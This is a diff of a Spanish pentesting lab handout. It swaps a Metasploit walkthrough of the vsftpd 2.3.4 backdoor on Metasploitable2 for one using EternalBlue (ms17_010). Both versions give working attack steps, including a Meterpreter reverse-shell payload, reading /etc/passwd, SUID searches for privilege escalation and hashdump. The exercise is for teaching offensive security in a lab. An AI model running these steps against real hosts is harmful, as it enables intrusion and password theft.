@@ -1,88 +1,50 @@
-# Práctica 04.- 🛠 Práctica 04: Fase de Explotación con Metasploit
-Luis ha identificado una vulnerabilidad en el servidor FTP vsftpd 2.3.4 que se ejecuta en el puerto TCP/21 de la máquina Metasploitable2. Ahora, usaremos Metasploit para explotar esta vulnerabilidad y obtener acceso a la máquina víctima.
-
-## 1️⃣ Información sobre la Vulnerabilidad
-El servidor vsftpd 2.3.4 tiene una vulnerabilidad que permite obtener una shell remota en el sistema. Esta vulnerabilidad se encuentra en la versión comprometida de vsftpd y se activa al intentar iniciar sesión con un usuario que contenga :) en el nombre.
-
-Exploit disponible en Metasploit: exploit/unix/ftp/vsftpd_234_backdoor
-
-## 2️⃣ Iniciar Metasploit en Kali Linux
-Abrimos una terminal y ejecutamos:
-
-```bash
+# Práctica 04 - Fase de Explotación con Metasploit
+## 1. Iniciar Metasploit Framework
+Iniciamos Metasploit en tu terminal:
+```zsh
 msfconsole
 ```
-Esperamos a que se cargue Metasploit Framework.
 
-## 3️⃣ Buscar y Seleccionar el Exploit
-Buscamos el exploit correspondiente:
-
-```bash
-search vsftpd
+## 2. Buscar un exploit específico
+Utilizamos el comando search para localizar un exploit relevante:
+```zsh
+search type:exploit name:ms17_010
 ```
-El resultado mostrará algo similar a:
 
-```bash
-exploit/unix/ftp/vsftpd_234_backdoor
+## 3. Seleccionar el exploit
+Seleccionamos el exploit encontrado en el paso anterior:
+```zsh
+use exploit/windows/smb/ms17_010_eternalblue
 ```
-Seleccionamos el exploit:
 
-```bash
-use exploit/unix/ftp/vsftpd_234_backdoor
+## 4. Configurar parámetros del exploit
+Configuramos la dirección IP del objetivo:
+```zsh
+set RHOSTS 192.168.1.10
 ```
-## 4️⃣ Configurar los Parámetros del Exploit
-### 1️⃣ Definir la IP de la máquina víctima (Metasploitable2):
 
-```bash
-set RHOSTS 10.0.2.15
+## 5. Configurar el payload
+Seleccionamos un payload compatible, como un shell reverso:
+```zsh
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
 ```
-(Asegúrate de reemplazar 10.0.2.15 con la IP real de la máquina víctima obtenida en la fase de escaneo.)
-
-### 2️⃣ Definir el puerto del servicio FTP (TCP/21):
-
-```bash
-set RPORT 21
+Configuramos la dirección IP local y el puerto de escucha:
+```zsh
+set LHOST 192.168.1.20
+set LPORT 4444
 ```
-### 5️⃣ Ejecutar el Exploit
-Iniciar la explotación con:
+Nota: LHOST es la IP de nuestra máquina y LPORT el puerto que escuchará el payload.
 
-```bash
+## 6. Ejecutar el exploit
+Lanzamos el ataque contra el objetivo:
+```zsh
 exploit
 ```
-Si todo funciona correctamente, obtendremos una shell remota con acceso al sistema.
 
-### 6️⃣ Validar el Acceso
-Si el exploit es exitoso, deberíamos ver algo como:
-
-```nginx
-Command shell session opened - 10.0.2.15:21
-```
-Ahora podemos ejecutar comandos en la máquina víctima, por ejemplo:
-
-```bash
-whoami
-uname -a
-cat /etc/passwd
-```
-### 7️⃣ Elevar Privilegios (Opcional)
-Si queremos obtener acceso root, podemos intentar técnicas de escalada de privilegios, como:
-
-```bash
-sudo -l
-```
-O buscar archivos con permisos mal configurados:
-
-```bash
-find / -perm -4000 2>/dev/null
-```
-### 8️⃣ Cerrar la Sesión
-Si queremos salir de la sesión, escribimos:
-
-```bash
-exit
-```
-Y luego cerramos Metasploit con:
-
-```bash
-exit
+## 7. Post-explotación
+Usamos los comandos de Meterpreter para obtener más información o control del sistema:
+```zsh
+sysinfo       # Obtiene información del sistema
+hashdump      # Extrae hashes de contraseñas
+shell         # Abre una terminal del sistema objetivo
 ```
